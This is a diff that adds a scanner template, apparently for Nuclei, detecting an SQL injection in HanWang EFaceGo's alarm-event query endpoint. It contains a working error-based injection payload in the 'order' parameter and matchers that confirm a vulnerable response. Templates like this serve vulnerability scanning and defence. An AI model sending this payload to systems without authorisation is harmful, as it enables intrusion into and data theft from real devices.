@@ -1,0 +1,27 @@
+id: HanWangEFaceGO-queryAlarmEvent-sqlInjection
+
+info:
+  name: HanWangEFaceGO-queryAlarmEvent-sqlInjection
+  author: iSee857
+  severity: high
+  description: |
+    HanWangEFaceGO-queryAlarmEvent-sqlInjection
+
+http:
+  - raw:
+      - |
+        GET /manage/alarm/queryAlarmEvent.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "qqjpq1qpkvq"
+          - "false"
+        condition: and
+
+      - type: status
+        status:
+          - 200
